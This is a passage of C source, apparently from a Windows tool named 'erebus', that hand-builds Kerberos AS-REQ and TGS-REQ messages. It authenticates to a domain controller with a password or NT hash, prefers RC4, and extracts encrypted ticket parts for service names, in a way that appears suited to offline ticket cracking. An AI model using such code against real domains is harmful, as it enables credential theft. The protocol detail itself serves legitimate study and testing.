#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "erebus/krb5_internal.h"

#pragma comment(lib, "ws2_32.lib")

void erebus_krb_enc_data_free(erebus_krb_enc_data *e) {
    if (!e) return;
    free(e->cipher);
    free(e->ticket_der);
    memset(e, 0, sizeof(*e));
}

void erebus_krb_creds_free(erebus_krb_creds *c) {
    if (!c) return;
    erebus_krb_enc_data_free(&c->tgt);
    memset(c, 0, sizeof(*c));
}

/* ---- TCP KDC ---- */

int erebus_krb_tcp_exchange(const char *host, uint16_t port,
    const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    *resp = NULL;
    *resp_len = 0;
    if (!host || !req || req_len == 0 || req_len > 0x100000) return 0;

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;

    char portstr[16];
    snprintf(portstr, sizeof(portstr), "%u", (unsigned)port);

    struct addrinfo hints, *ai = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &ai) != 0) {
        WSACleanup();
        return 0;
    }

    SOCKET s = INVALID_SOCKET;
    for (struct addrinfo *p = ai; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) break;
        closesocket(s);
        s = INVALID_SOCKET;
    }
    freeaddrinfo(ai);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return 0;
    }

    /* 4-byte BE length prefix */
    uint8_t hdr[4] = {
        (uint8_t)((req_len >> 24) & 0xFF),
        (uint8_t)((req_len >> 16) & 0xFF),
        (uint8_t)((req_len >> 8) & 0xFF),
        (uint8_t)(req_len & 0xFF),
    };
    if (send(s, (const char *)hdr, 4, 0) != 4) goto fail;
    size_t sent = 0;
    while (sent < req_len) {
        int n = send(s, (const char *)req + sent, (int)(req_len - sent), 0);
        if (n <= 0) goto fail;
        sent += (size_t)n;
    }

    uint8_t rhdr[4];
    int got = 0;
    while (got < 4) {
        int n = recv(s, (char *)rhdr + got, 4 - got, 0);
        if (n <= 0) goto fail;
        got += n;
    }
    size_t rlen = ((size_t)rhdr[0] << 24) | ((size_t)rhdr[1] << 16)
                | ((size_t)rhdr[2] << 8) | (size_t)rhdr[3];
    if (rlen == 0 || rlen > 0x200000) goto fail;

    uint8_t *buf = (uint8_t *)malloc(rlen);
    if (!buf) goto fail;
    size_t recvd = 0;
    while (recvd < rlen) {
        int n = recv(s, (char *)buf + recvd, (int)(rlen - recvd), 0);
        if (n <= 0) { free(buf); goto fail; }
        recvd += (size_t)n;
    }
    closesocket(s);
    WSACleanup();
    *resp = buf;
    *resp_len = rlen;
    return 1;

fail:
    if (s != INVALID_SOCKET) closesocket(s);
    WSACleanup();
    return 0;
}

/* ---- builders ---- */

static int put_principal(erebus_der_buf *out, int name_type, const char **parts, size_t nparts) {
    /* PrincipalName SEQUENCE { name-type[0] INTEGER, name-string[1] SEQUENCE OF GeneralString } */
    erebus_der_buf nt, ns, ns_inner, seq;
    if (!erebus_der_init(&nt, 16)) return 0;
    if (!erebus_der_put_int(&nt, 0x02, name_type)) { erebus_der_free(&nt); return 0; }

    if (!erebus_der_init(&ns_inner, 64)) { erebus_der_free(&nt); return 0; }
    for (size_t i = 0; i < nparts; i++) {
        if (!erebus_der_put_general_string(&ns_inner, 0x1B, parts[i])) {
            erebus_der_free(&nt); erebus_der_free(&ns_inner); return 0;
        }
    }
    if (!erebus_der_init(&ns, 128)) { erebus_der_free(&nt); erebus_der_free(&ns_inner); return 0; }
    if (!erebus_der_put_seq(&ns, ns_inner.data, ns_inner.len)) {
        erebus_der_free(&nt); erebus_der_free(&ns_inner); erebus_der_free(&ns); return 0;
    }
    erebus_der_free(&ns_inner);

    if (!erebus_der_init(&seq, 128)) { erebus_der_free(&nt); erebus_der_free(&ns); return 0; }
    if (!erebus_der_put_ctx_seq(&seq, 0, nt.data, nt.len)) goto fail;
    if (!erebus_der_put_ctx_seq(&seq, 1, ns.data, ns.len)) goto fail;
    erebus_der_free(&nt);
    erebus_der_free(&ns);

    int ok = erebus_der_put_seq(out, seq.data, seq.len);
    erebus_der_free(&seq);
    return ok;
fail:
    erebus_der_free(&nt); erebus_der_free(&ns); erebus_der_free(&seq);
    return 0;
}

static int put_encrypted_data(erebus_der_buf *out, int32_t etype, const uint8_t *cipher, size_t clen) {
    erebus_der_buf et, ciph, seq;
    if (!erebus_der_init(&et, 16)) return 0;
    if (!erebus_der_put_int(&et, 0x02, etype)) { erebus_der_free(&et); return 0; }
    if (!erebus_der_init(&ciph, clen + 16)) { erebus_der_free(&et); return 0; }
    if (!erebus_der_put_octet(&ciph, 0x04, cipher, clen)) { erebus_der_free(&et); erebus_der_free(&ciph); return 0; }
    if (!erebus_der_init(&seq, clen + 32)) { erebus_der_free(&et); erebus_der_free(&ciph); return 0; }
    if (!erebus_der_put_ctx_seq(&seq, 0, et.data, et.len)) goto fail;
    if (!erebus_der_put_ctx_seq(&seq, 2, ciph.data, ciph.len)) goto fail;
    erebus_der_free(&et); erebus_der_free(&ciph);
    int ok = erebus_der_put_seq(out, seq.data, seq.len);
    erebus_der_free(&seq);
    return ok;
fail:
    erebus_der_free(&et); erebus_der_free(&ciph); erebus_der_free(&seq);
    return 0;
}

static int put_pa_data(erebus_der_buf *out, int32_t padata_type, const uint8_t *val, size_t vlen) {
    erebus_der_buf t, v, seq;
    if (!erebus_der_init(&t, 16)) return 0;
    if (!erebus_der_put_int(&t, 0x02, padata_type)) { erebus_der_free(&t); return 0; }
    if (!erebus_der_init(&v, vlen + 16)) { erebus_der_free(&t); return 0; }
    if (!erebus_der_put_octet(&v, 0x04, val, vlen)) { erebus_der_free(&t); erebus_der_free(&v); return 0; }
    if (!erebus_der_init(&seq, vlen + 32)) { erebus_der_free(&t); erebus_der_free(&v); return 0; }
    if (!erebus_der_put_ctx_seq(&seq, 1, t.data, t.len)) goto fail;
    if (!erebus_der_put_ctx_seq(&seq, 2, v.data, v.len)) goto fail;
    erebus_der_free(&t); erebus_der_free(&v);
    int ok = erebus_der_put_seq(out, seq.data, seq.len);
    erebus_der_free(&seq);
    return ok;
fail:
    erebus_der_free(&t); erebus_der_free(&v); erebus_der_free(&seq);
    return 0;
}

static void kerberos_time_now(char out[16]) {
    /* GeneralizedTime UTC YYYYMMDDHHMMSSZ */
    time_t t = time(NULL);
    struct tm tm;
    gmtime_s(&tm, &t);
    snprintf(out, 16, "%04d%02d%02d%02d%02d%02dZ",
        tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
        tm.tm_hour, tm.tm_min, tm.tm_sec);
}

static int krb_encrypt(int etype, const uint8_t *key, size_t key_len, int32_t usage,
    const uint8_t *plain, size_t plain_len, uint8_t **out, size_t *out_len) {
    if (etype == EREBUS_KRB_ETYPE_RC4)
        return erebus_rc4_hmac_encrypt(key, usage, plain, plain_len, out, out_len);
    if (etype == EREBUS_KRB_ETYPE_AES128 || etype == EREBUS_KRB_ETYPE_AES256)
        return erebus_aes_cts_hmac_encrypt(key, key_len, usage, plain, plain_len, out, out_len);
    return 0;
}

static int krb_decrypt(int etype, const uint8_t *key, size_t key_len, int32_t usage,
    const uint8_t *cipher, size_t cipher_len, uint8_t **out, size_t *out_len) {
    if (etype == EREBUS_KRB_ETYPE_RC4)
        return erebus_rc4_hmac_decrypt(key, usage, cipher, cipher_len, out, out_len);
    if (etype == EREBUS_KRB_ETYPE_AES128 || etype == EREBUS_KRB_ETYPE_AES256)
        return erebus_aes_cts_hmac_decrypt(key, key_len, usage, cipher, cipher_len, out, out_len);
    return 0;
}

static int build_pa_enc_timestamp(int etype, const uint8_t *key, size_t key_len,
    uint8_t **out, size_t *out_len) {
    char gtime[16];
    kerberos_time_now(gtime);
    /* PA-ENC-TS-ENC ::= SEQUENCE { patimestamp[0] KerberosTime, pausec[1] Microseconds OPTIONAL } */
    erebus_der_buf ts, seq, inner;
    if (!erebus_der_init(&ts, 32)) return 0;
    if (!erebus_der_put_tl(&ts, 0x18, (const uint8_t *)gtime, 15)) { erebus_der_free(&ts); return 0; }
    if (!erebus_der_init(&seq, 64)) { erebus_der_free(&ts); return 0; }
    if (!erebus_der_put_ctx_seq(&seq, 0, ts.data, ts.len)) { erebus_der_free(&ts); erebus_der_free(&seq); return 0; }
    erebus_der_free(&ts);
    if (!erebus_der_init(&inner, 64)) { erebus_der_free(&seq); return 0; }
    if (!erebus_der_put_seq(&inner, seq.data, seq.len)) { erebus_der_free(&seq); erebus_der_free(&inner); return 0; }
    erebus_der_free(&seq);

    uint8_t *cipher = NULL;
    size_t clen = 0;
    /* key usage 1 = AS-REQ PA-ENC-TIMESTAMP */
    if (!krb_encrypt(etype, key, key_len, 1, inner.data, inner.len, &cipher, &clen)) {
        erebus_der_free(&inner);
        return 0;
    }
    erebus_der_free(&inner);

    erebus_der_buf ed;
    if (!erebus_der_init(&ed, clen + 32)) { free(cipher); return 0; }
    if (!put_encrypted_data(&ed, etype, cipher, clen)) {
        free(cipher); erebus_der_free(&ed); return 0;
    }
    free(cipher);
    *out = ed.data;
    *out_len = ed.len;
    return 1;
}

static int build_kdc_req_body(erebus_der_buf *out,
    int msg_type_for_sname, /* unused */
    const char *realm, const char *cname_user,
    const char **sname_parts, size_t sname_n,
    int32_t sname_type,
    int include_cname) {
    (void)msg_type_for_sname;
    erebus_der_buf body;
    if (!erebus_der_init(&body, 512)) return 0;

    /* kdc-options[0] KDCOptions BIT STRING — forwardable, renewable, canonicalize */
    uint8_t opts[4] = { 0x40, 0x81, 0x00, 0x10 }; /* forwardable | renewable | canonicalize */
    erebus_der_buf optb;
    if (!erebus_der_init(&optb, 16)) { erebus_der_free(&body); return 0; }
    if (!erebus_der_put_bitstring_unused0(&optb, 0x03, opts, 4)) { erebus_der_free(&optb); erebus_der_free(&body); return 0; }
    if (!erebus_der_put_ctx_seq(&body, 0, optb.data, optb.len)) { erebus_der_free(&optb); erebus_der_free(&body); return 0; }
    erebus_der_free(&optb);

    if (include_cname && cname_user) {
        erebus_der_buf cn;
        if (!erebus_der_init(&cn, 128)) { erebus_der_free(&body); return 0; }
        const char *parts[1] = { cname_user };
        if (!put_principal(&cn, 1 /* NT-PRINCIPAL */, parts, 1)) { erebus_der_free(&cn); erebus_der_free(&body); return 0; }
        if (!erebus_der_put_ctx_seq(&body, 1, cn.data, cn.len)) { erebus_der_free(&cn); erebus_der_free(&body); return 0; }
        erebus_der_free(&cn);
    }

    /* realm[2] */
    erebus_der_buf rl;
    if (!erebus_der_init(&rl, 64)) { erebus_der_free(&body); return 0; }
    if (!erebus_der_put_general_string(&rl, 0x1B, realm)) { erebus_der_free(&rl); erebus_der_free(&body); return 0; }
    if (!erebus_der_put_ctx_seq(&body, 2, rl.data, rl.len)) { erebus_der_free(&rl); erebus_der_free(&body); return 0; }
    erebus_der_free(&rl);

    /* sname[3] */
    if (sname_parts && sname_n) {
        erebus_der_buf sn;
        if (!erebus_der_init(&sn, 128)) { erebus_der_free(&body); return 0; }
        if (!put_principal(&sn, sname_type, sname_parts, sname_n)) { erebus_der_free(&sn); erebus_der_free(&body); return 0; }
        if (!erebus_der_put_ctx_seq(&body, 3, sn.data, sn.len)) { erebus_der_free(&sn); erebus_der_free(&body); return 0; }
        erebus_der_free(&sn);
    }

    /* till[5] far future */
    char till[16] = "20300101000000Z";
    erebus_der_buf tb;
    if (!erebus_der_init(&tb, 32)) { erebus_der_free(&body); return 0; }
    if (!erebus_der_put_tl(&tb, 0x18, (const uint8_t *)till, 15)) { erebus_der_free(&tb); erebus_der_free(&body); return 0; }
    if (!erebus_der_put_ctx_seq(&body, 5, tb.data, tb.len)) { erebus_der_free(&tb); erebus_der_free(&body); return 0; }
    erebus_der_free(&tb);

    /* nonce[7] */
    uint8_t nonce_raw[4];
    erebus_krb_random(nonce_raw, 4);
    int32_t nonce = (int32_t)((nonce_raw[0] << 24) | (nonce_raw[1] << 16) | (nonce_raw[2] << 8) | nonce_raw[3]);
    if (nonce < 0) nonce = -nonce;
    erebus_der_buf nb;
    if (!erebus_der_init(&nb, 16)) { erebus_der_free(&body); return 0; }
    if (!erebus_der_put_int(&nb, 0x02, nonce)) { erebus_der_free(&nb); erebus_der_free(&body); return 0; }
    if (!erebus_der_put_ctx_seq(&body, 7, nb.data, nb.len)) { erebus_der_free(&nb); erebus_der_free(&body); return 0; }
    erebus_der_free(&nb);

    /* etype[8] SEQUENCE OF Int32 — prefer RC4 then AES */
    erebus_der_buf elist, e1, e2, e3;
    if (!erebus_der_init(&elist, 64)) { erebus_der_free(&body); return 0; }
    if (!erebus_der_init(&e1, 8) || !erebus_der_put_int(&e1, 0x02, EREBUS_KRB_ETYPE_RC4)) {
        erebus_der_free(&e1); erebus_der_free(&elist); erebus_der_free(&body); return 0;
    }
    if (!erebus_der_init(&e2, 8) || !erebus_der_put_int(&e2, 0x02, EREBUS_KRB_ETYPE_AES256)) {
        erebus_der_free(&e1); erebus_der_free(&e2); erebus_der_free(&elist); erebus_der_free(&body); return 0;
    }
    if (!erebus_der_init(&e3, 8) || !erebus_der_put_int(&e3, 0x02, EREBUS_KRB_ETYPE_AES128)) {
        erebus_der_free(&e1); erebus_der_free(&e2); erebus_der_free(&e3); erebus_der_free(&elist); erebus_der_free(&body); return 0;
    }
    erebus_der_append(&elist, e1.data, e1.len);
    erebus_der_append(&elist, e2.data, e2.len);
    erebus_der_append(&elist, e3.data, e3.len);
    erebus_der_free(&e1); erebus_der_free(&e2); erebus_der_free(&e3);
    erebus_der_buf etseq;
    if (!erebus_der_init(&etseq, 64)) { erebus_der_free(&elist); erebus_der_free(&body); return 0; }
    if (!erebus_der_put_seq(&etseq, elist.data, elist.len)) {
        erebus_der_free(&elist); erebus_der_free(&etseq); erebus_der_free(&body); return 0;
    }
    erebus_der_free(&elist);
    if (!erebus_der_put_ctx_seq(&body, 8, etseq.data, etseq.len)) {
        erebus_der_free(&etseq); erebus_der_free(&body); return 0;
    }
    erebus_der_free(&etseq);

    int ok = erebus_der_put_seq(out, body.data, body.len);
    erebus_der_free(&body);
    return ok;
}

static int build_as_req(const char *realm, const char *user,
    const uint8_t *padata_blob, size_t padata_len,
    uint8_t **out, size_t *out_len) {
    char realm_up[256];
    size_t rl = strlen(realm);
    if (rl >= sizeof(realm_up)) return 0;
    for (size_t i = 0; i < rl; i++) {
        char c = realm[i];
        realm_up[i] = (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
    }
    realm_up[rl] = '\0';

    const char *krbtgt[2] = { "krbtgt", realm_up };
    erebus_der_buf body;
    if (!erebus_der_init(&body, 512)) return 0;
    if (!build_kdc_req_body(&body, 10, realm_up, user, krbtgt, 2, 2 /* NT-SRV-INST */, 1)) {
        erebus_der_free(&body);
        return 0;
    }

    erebus_der_buf req;
    if (!erebus_der_init(&req, 1024)) { erebus_der_free(&body); return 0; }

    /* pvno[1]=5, msg-type[2]=10 */
    erebus_der_buf pv, mt;
    erebus_der_init(&pv, 8); erebus_der_put_int(&pv, 0x02, 5);
    erebus_der_init(&mt, 8); erebus_der_put_int(&mt, 0x02, 10);
    erebus_der_put_ctx_seq(&req, 1, pv.data, pv.len);
    erebus_der_put_ctx_seq(&req, 2, mt.data, mt.len);
    erebus_der_free(&pv); erebus_der_free(&mt);

    if (padata_blob && padata_len) {
        erebus_der_buf pa_seq, pa_one;
        erebus_der_init(&pa_one, padata_len + 32);
        /* padata already a PA-DATA sequence element? We pass raw EncryptedData for type 2 */
        /* Build PA-DATA type 2 (PA-ENC-TIMESTAMP) */
        put_pa_data(&pa_one, 2, padata_blob, padata_len);
        erebus_der_init(&pa_seq, pa_one.len + 16);
        erebus_der_put_seq(&pa_seq, pa_one.data, pa_one.len);
        erebus_der_put_ctx_seq(&req, 3, pa_seq.data, pa_seq.len);
        erebus_der_free(&pa_one); erebus_der_free(&pa_seq);
    }

    erebus_der_put_ctx_seq(&req, 4, body.data, body.len);
    erebus_der_free(&body);

    erebus_der_buf app;
    if (!erebus_der_init(&app, req.len + 16)) { erebus_der_free(&req); return 0; }
    if (!erebus_der_put_app(&app, 10, req.data, req.len)) { erebus_der_free(&req); erebus_der_free(&app); return 0; }
    erebus_der_free(&req);
    *out = app.data;
    *out_len = app.len;
    return 1;
}

/* Parse EncryptedData SEQUENCE → etype + cipher */
static int parse_encrypted_data(const uint8_t *seq, size_t seq_len, int32_t *etype,
    uint8_t **cipher, size_t *clen) {
    if (!erebus_der_r_ctx_int(seq, seq_len, 0, etype)) return 0;
    const uint8_t *c;
    size_t cn;
    if (!erebus_der_r_ctx_octet(seq, seq_len, 2, &c, &cn)) return 0;
    *cipher = (uint8_t *)malloc(cn);
    if (!*cipher) return 0;
    memcpy(*cipher, c, cn);
    *clen = cn;
    return 1;
}

/* Extract Ticket APPLICATION 1 from AS-REP/TGS-REP field ticket[5] */
static int extract_ticket_blob(const uint8_t *rep_seq, size_t rep_len,
    erebus_krb_enc_data *out) {
    const uint8_t *tctx;
    size_t tlen;
    uint8_t tag;
    if (!erebus_der_r_find_ctx(rep_seq, rep_len, 5, &tag, &tctx, &tlen)) return 0;

    /* ticket content may be APPLICATION 1 or SEQUENCE */
    const uint8_t *ticket_der = tctx;
    size_t ticket_der_len = tlen;
    const uint8_t *ticket_seq = tctx;
    size_t ticket_seq_len = tlen;

    /* If wrapped as APPLICATION 1, keep full DER for AP-REQ */
    if (tlen >= 2 && (tctx[0] & 0xE0) == 0x60) {
        /* Already full ticket TLV — re-encode as full blob */
        /* tctx points inside parent; need full TLV. Reconstruct: */
        /* Actually find_ctx returns value only. Rebuild APPLICATION 1. */
        erebus_der_buf app;
        if (!erebus_der_init(&app, tlen + 16)) return 0;
        if (!erebus_der_put_app(&app, 1, tctx, tlen)) { erebus_der_free(&app); return 0; }
        out->ticket_der = app.data;
        out->ticket_der_len = app.len;
        ticket_seq = tctx;
        ticket_seq_len = tlen;
    } else {
        /* SEQUENCE ticket fields */
        erebus_der_buf app;
        if (!erebus_der_init(&app, tlen + 16)) return 0;
        if (!erebus_der_put_app(&app, 1, tctx, tlen)) { erebus_der_free(&app); return 0; }
        out->ticket_der = app.data;
        out->ticket_der_len = app.len;
        ticket_seq = tctx;
        ticket_seq_len = tlen;
        (void)ticket_der;
        (void)ticket_der_len;
    }

    /* Ticket: enc-part[3] EncryptedData */
    const uint8_t *ep;
    size_t eplen;
    uint8_t etag;
    if (!erebus_der_r_find_ctx(ticket_seq, ticket_seq_len, 3, &etag, &ep, &eplen)) return 0;
    return parse_encrypted_data(ep, eplen, &out->etype, &out->cipher, &out->cipher_len);
}

/* Parse EncASRepPart for session key */
static int parse_enc_kdc_rep_part(const uint8_t *plain, size_t plain_len, erebus_krb_creds *creds) {
    /* May be APPLICATION 25/26 wrapping SEQUENCE, or bare SEQUENCE */
    const uint8_t *seq = plain;
    size_t seq_len = plain_len;
    if (plain_len >= 2 && (plain[0] & 0xE0) == 0x60) {
        erebus_der_reader r;
        erebus_der_r_init(&r, plain, plain_len);
        uint8_t tag;
        if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len)) return 0;
    } else if (plain_len >= 2 && plain[0] == 0x30) {
        erebus_der_reader r;
        erebus_der_r_init(&r, plain, plain_len);
        uint8_t tag;
        if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len)) return 0;
    }

    /* key[0] EncryptionKey { keytype[0] Int32, keyvalue[1] OCTET STRING } */
    const uint8_t *keyseq;
    size_t keylen;
    uint8_t ktag;
    if (!erebus_der_r_find_ctx(seq, seq_len, 0, &ktag, &keyseq, &keylen)) return 0;
    int32_t kt = 0;
    if (!erebus_der_r_ctx_int(keyseq, keylen, 0, &kt)) return 0;
    const uint8_t *kv;
    size_t kvn;
    if (!erebus_der_r_ctx_octet(keyseq, keylen, 1, &kv, &kvn)) return 0;
    if (kvn > sizeof(creds->session_key)) return 0;
    memcpy(creds->session_key, kv, kvn);
    creds->session_key_len = kvn;
    creds->session_etype = kt;
    return 1;
}

static int parse_as_rep(const uint8_t *msg, size_t msg_len,
    int key_etype, const uint8_t *key, size_t key_len,
    erebus_krb_creds *creds) {
    erebus_der_reader r;
    erebus_der_r_init(&r, msg, msg_len);
    uint8_t tag;
    const uint8_t *seq;
    size_t seq_len;
    if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len)) return 0;
    /* APPLICATION 11 */
    if ((tag & 0x1F) != 11) return 0;

    /* enc-part[6] EncryptedData */
    const uint8_t *ep;
    size_t eplen;
    uint8_t etag;
    if (!erebus_der_r_find_ctx(seq, seq_len, 6, &etag, &ep, &eplen)) return 0;
    int32_t etype = 0;
    uint8_t *cipher = NULL;
    size_t clen = 0;
    if (!parse_encrypted_data(ep, eplen, &etype, &cipher, &clen)) return 0;

    /* Decrypt with long-term key; etype in enc-part should match key etype. */
    (void)key_etype;
    uint8_t *plain = NULL;
    size_t plen = 0;
    /* key usage 3 = AS-REP encrypted part; try 8 if needed (legacy) */
    if (!krb_decrypt(etype, key, key_len, 3, cipher, clen, &plain, &plen)) {
        if (!krb_decrypt(etype, key, key_len, 8, cipher, clen, &plain, &plen)) {
            free(cipher);
            return 0;
        }
    }
    free(cipher);
    if (!parse_enc_kdc_rep_part(plain, plen, creds)) {
        free(plain);
        return 0;
    }
    free(plain);

    if (!extract_ticket_blob(seq, seq_len, &creds->tgt)) return 0;
    return 1;
}

static int is_krb_error(const uint8_t *msg, size_t msg_len, int32_t *error_code) {
    if (msg_len < 2) return 0;
    erebus_der_reader r;
    erebus_der_r_init(&r, msg, msg_len);
    uint8_t tag;
    const uint8_t *seq;
    size_t seq_len;
    if (!erebus_der_r_tag_len(&r, &tag, &seq, &seq_len)) return 0;
    if ((tag & 0x1F) != 30) return 0;
    if (error_code) {
        if (!erebus_der_r_ctx_int(seq, seq_len, 6, error_code)) *error_code = -1;
    }
    return 1;
}

static int as_req_with_key(const char *dc, const char *realm, const char *user,
    int etype, const uint8_t *key, size_t key_len, erebus_krb_creds *out_creds) {
    uint8_t *pa_ts = NULL;
    size_t pa_ts_len = 0;
    if (!build_pa_enc_timestamp(etype, key, key_len, &pa_ts, &pa_ts_len)) return 0;

    uint8_t *req = NULL;
    size_t req_len = 0;
    if (!build_as_req(realm, user, pa_ts, pa_ts_len, &req, &req_len)) {
        free(pa_ts);
        return 0;
    }
    free(pa_ts);

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    if (!erebus_krb_tcp_exchange(dc, 88, req, req_len, &resp, &resp_len)) {
        free(req);
        return 0;
    }
    free(req);

    int32_t err = 0;
    if (is_krb_error(resp, resp_len, &err)) {
        free(resp);
        return 0;
    }

    int ok = parse_as_rep(resp, resp_len, etype, key, key_len, out_creds);
    free(resp);
    return ok;
}

int erebus_krb_as_req(const char *dc, const char *realm, const char *user, const char *password,
    erebus_krb_creds *out_creds) {
    memset(out_creds, 0, sizeof(*out_creds));

    /* Try RC4 (etype 23), then AES256, then AES128 long-term keys. */
    uint8_t nt[16];
    if (erebus_nt_hash(password, nt)) {
        if (as_req_with_key(dc, realm, user, EREBUS_KRB_ETYPE_RC4, nt, 16, out_creds))
            return 1;
    }

    uint8_t aes_key[32];
    size_t aes_len = 0;
    if (erebus_aes_string_to_key(EREBUS_KRB_ETYPE_AES256, password, realm, user, aes_key, &aes_len)) {
        if (as_req_with_key(dc, realm, user, EREBUS_KRB_ETYPE_AES256, aes_key, aes_len, out_creds))
            return 1;
    }
    if (erebus_aes_string_to_key(EREBUS_KRB_ETYPE_AES128, password, realm, user, aes_key, &aes_len)) {
        if (as_req_with_key(dc, realm, user, EREBUS_KRB_ETYPE_AES128, aes_key, aes_len, out_creds))
            return 1;
    }
    return 0;
}

/* Split SPN "service/host:port" into principal name parts */
static int split_spn(const char *spn, char *svc, size_t svc_cap, char *host, size_t host_cap) {
    const char *slash = strchr(spn, '/');
    if (!slash || slash == spn) return 0;
    size_t sn = (size_t)(slash - spn);
    if (sn >= svc_cap) return 0;
    memcpy(svc, spn, sn);
    svc[sn] = '\0';
    const char *h = slash + 1;
    /* strip :port for principal? Keep full host part as Windows does often use host:port as instance */
    size_t hn = strlen(h);
    if (hn >= host_cap) return 0;
    memcpy(host, h, hn + 1);
    return 1;
}

static int build_authenticator(const char *realm, const char *user,
    const uint8_t *session_key, size_t sk_len, int32_t sk_etype,
    uint8_t **out, size_t *out_len) {
    if (sk_etype != EREBUS_KRB_ETYPE_RC4
        && sk_etype != EREBUS_KRB_ETYPE_AES128
        && sk_etype != EREBUS_KRB_ETYPE_AES256)
        return 0;
    if (sk_etype == EREBUS_KRB_ETYPE_RC4 && sk_len < 16) return 0;
    if (sk_etype == EREBUS_KRB_ETYPE_AES128 && sk_len < 16) return 0;
    if (sk_etype == EREBUS_KRB_ETYPE_AES256 && sk_len < 32) return 0;

    char realm_up[256];
    size_t rl = strlen(realm);
    if (rl >= sizeof(realm_up)) return 0;
    for (size_t i = 0; i < rl; i++) {
        char c = realm[i];
        realm_up[i] = (c >= 'a' && c <= 'z') ? (char)(c - 32) : c;
    }
    realm_up[rl] = '\0';

    char gtime[16];
    kerberos_time_now(gtime);

    erebus_der_buf auth;
    if (!erebus_der_init(&auth, 256)) return 0;

    /* Authenticator SEQUENCE fields */
    erebus_der_buf av, cr, cn, ct;
    erebus_der_init(&av, 8); erebus_der_put_int(&av, 0x02, 5);
    erebus_der_put_ctx_seq(&auth, 0, av.data, av.len);
    erebus_der_free(&av);

    erebus_der_init(&cr, 64); erebus_der_put_general_string(&cr, 0x1B, realm_up);
    erebus_der_put_ctx_seq(&auth, 1, cr.data, cr.len);
    erebus_der_free(&cr);

    erebus_der_init(&cn, 128);
    const char *parts[1] = { user };
    put_principal(&cn, 1, parts, 1);
    erebus_der_put_ctx_seq(&auth, 2, cn.data, cn.len);
    erebus_der_free(&cn);

    /* cusec[3] = 0 */
    erebus_der_buf cu;
    erebus_der_init(&cu, 8); erebus_der_put_int(&cu, 0x02, 0);
    erebus_der_put_ctx_seq(&auth, 3, cu.data, cu.len);
    erebus_der_free(&cu);

    erebus_der_init(&ct, 32); erebus_der_put_tl(&ct, 0x18, (const uint8_t *)gtime, 15);
    erebus_der_put_ctx_seq(&auth, 4, ct.data, ct.len);
    erebus_der_free(&ct);

    erebus_der_buf seq, app;
    erebus_der_init(&seq, auth.len + 16);
    erebus_der_put_seq(&seq, auth.data, auth.len);
    erebus_der_free(&auth);
    erebus_der_init(&app, seq.len + 16);
    erebus_der_put_app(&app, 2, seq.data, seq.len); /* APPLICATION 2 Authenticator */
    erebus_der_free(&seq);

    uint8_t *cipher = NULL;
    size_t clen = 0;
    size_t use_len = sk_etype == EREBUS_KRB_ETYPE_AES256 ? 32 :
                     sk_etype == EREBUS_KRB_ETYPE_AES128 ? 16 : 16;
    /* key usage 7 = TGS-REQ PA-TGS-REQ authenticator */
    if (!krb_encrypt(sk_etype, session_key, use_len, 7, app.data, app.len, &cipher, &clen)) {
        erebus_der_free(&app);
        return 0;
    }
    erebus_der_free(&app);
    *out = cipher;
    *out_len = clen;
    return 1;
}

static int build_ap_req(const erebus_krb_creds *creds, const uint8_t *auth_cipher, size_t auth_clen,
    uint8_t **out, size_t *out_len) {
    erebus_der_buf ap;
    if (!erebus_der_init(&ap, creds->tgt.ticket_der_len + auth_clen + 128)) return 0;

    erebus_der_buf pv, mt, ao;
    erebus_der_init(&pv, 8); erebus_der_put_int(&pv, 0x02, 5);
    erebus_der_init(&mt, 8); erebus_der_put_int(&mt, 0x02, 14);
    uint8_t opts[4] = { 0, 0, 0, 0 };
    erebus_der_init(&ao, 16); erebus_der_put_bitstring_unused0(&ao, 0x03, opts, 4);
    erebus_der_put_ctx_seq(&ap, 0, pv.data, pv.len);
    erebus_der_put_ctx_seq(&ap, 1, mt.data, mt.len);
    erebus_der_put_ctx_seq(&ap, 2, ao.data, ao.len);
    erebus_der_free(&pv); erebus_der_free(&mt); erebus_der_free(&ao);

    /* ticket[3] — ticket_der is full APPLICATION 1; put as context content */
    /* If ticket_der is APPLICATION 1 TLV, extract value or embed whole */
    const uint8_t *td = creds->tgt.ticket_der;
    size_t tdl = creds->tgt.ticket_der_len;
    if (tdl >= 2 && (td[0] & 0x1F) == 1) {
        /* Use full ticket as [3] content (constructed with ticket inside) */
        erebus_der_put_ctx_seq(&ap, 3, td, tdl);
    } else {
        erebus_der_put_ctx_seq(&ap, 3, td, tdl);
    }

    erebus_der_buf ed;
    erebus_der_init(&ed, auth_clen + 32);
    put_encrypted_data(&ed, creds->session_etype, auth_cipher, auth_clen);
    erebus_der_put_ctx_seq(&ap, 4, ed.data, ed.len);
    erebus_der_free(&ed);

    erebus_der_buf seq, app;
    erebus_der_init(&seq, ap.len + 16);
    erebus_der_put_seq(&seq, ap.data, ap.len);
    erebus_der_free(&ap);
    erebus_der_init(&app, seq.len + 16);
    erebus_der_put_app(&app, 14, seq.data, seq.len);
    erebus_der_free(&seq);
    *out = app.data;
    *out_len = app.len;
    return 1;
}

static int tgs_req_with_user(const char *dc, const char *realm, const char *user, const char *spn,
    const erebus_krb_creds *creds, erebus_krb_enc_data *out_st) {
    memset(out_st, 0, sizeof(*out_st));
    if (creds->session_etype != EREBUS_KRB_ETYPE_RC4
        && creds->session_etype != EREBUS_KRB_ETYPE_AES128
        && creds->session_etype != EREBUS_KRB_ETYPE_AES256)
        return 0;

    char svc[128], host[384];
    if (!split_spn(spn, svc, sizeof(svc), host, sizeof(host))) return 0;
    const char *sname[2] = { svc, host };

    char realm_up[256];
